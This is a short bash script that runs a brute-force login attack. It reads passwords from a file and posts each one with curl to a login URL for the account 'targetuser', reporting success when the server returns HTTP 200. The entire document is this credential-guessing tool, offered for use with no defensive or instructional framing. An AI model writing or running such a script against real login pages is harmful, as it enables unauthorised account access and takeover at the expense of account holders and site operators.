#!/bin/bash

user="targetuser"
passwords="/path/to/passwords.sh"
url="https://example.com/login"

while read password; do
    echo "Trying password: $password"
    response=$(curl -s -o /dev/null -w "%{http_code}" --data "username=$user&password=$password" $url)
    if [ $response -eq 200 ]; then
        echo "Success! Password is: $password"
        break
    fi
done < $passwords
